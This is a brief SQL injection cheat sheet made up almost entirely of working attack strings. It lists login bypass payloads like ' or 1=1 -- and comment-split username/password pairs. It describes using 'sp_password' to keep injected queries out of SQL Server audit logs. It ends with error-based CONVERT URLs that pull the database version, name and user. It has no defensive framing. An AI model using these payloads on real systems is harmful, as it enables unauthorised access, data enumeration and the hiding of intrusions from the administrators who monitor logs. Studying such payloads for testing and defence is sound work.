Authentication Bypass examples:
------------------------------------------------------------------------------
' or 1=1 --
a' or 1=1 --
" or 1=1 --
a" or 1=1 --
' or 1=1 #
" or 1=1 #
or 1=1 --
' or 'x'='x
" or "x"="x
') or ('x'='x
") or ("x"="x
' or username LIKE '%admin%

USERNAME:  ' or 1/*
PASSWORD:  */ =1 --    |

USERNAME: admin' or 'a'='a |
PASSWORD: '#		     
------------------------------------------------------------------------------
Audit Log Evasion:
------------------------------------------------------------------------------
All of our SQL queries are logged and can be observed by admin.
But we can use "sp_password" to evade logging.

formusr = ' or 1=1 -- sp_password
formpwd = anything

SQL server don't log queries which includes sp_password for security reasons.


------------------------------------------------------------------------------
Error Message Attack with "CONVERT"
------------------------------------------------------------------------------
http://www.example.com/page.asp?id=1+and+1=convert(int,@@version)--   //enumerate db version
http://www.example.com/page.asp?id=1+and+1=convert(int,db_name())--   //enumerate db name
http://www.example.com/page.asp?id=1+and+1=convert(int,user_name())-- //enumerate username
